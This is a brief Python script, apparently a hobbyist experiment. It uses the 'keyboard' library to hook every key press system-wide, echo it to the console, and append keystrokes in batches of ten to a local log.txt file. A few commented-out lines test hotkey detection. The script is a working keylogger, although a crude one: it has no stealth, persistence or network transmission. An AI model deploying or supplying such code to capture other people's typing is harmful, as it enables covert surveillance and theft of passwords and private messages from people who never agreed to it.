import keyboard
import time
keys = []

#keyboard.add_hotkey('ctrl + shift + z', print, args=('Hotkey', 'Detected'))
#keyboard.add_hotkey('ctrl + alt + delete', print, args=('Hotkey', 'Detected'))

hotkey = "shift" + "ctrl"

def key_pressed(event):

    key = (event.name)
    file = open("log.txt", "a")
    print(key)
    keys.append(event.name)

    if len(keys) == 10:
        for element in keys:
            file.write(element)
        file.write("\n")
        keys.clear()
    file.close()
    print(keys)

#while True:
#  if keyboard.is_pressed(hotkey):
#    print("Hotkey is being pressed")
#    time.sleep(0.05)
#  time.sleep(0.01)

keyboard.on_press(key_pressed)
keyboard.wait()
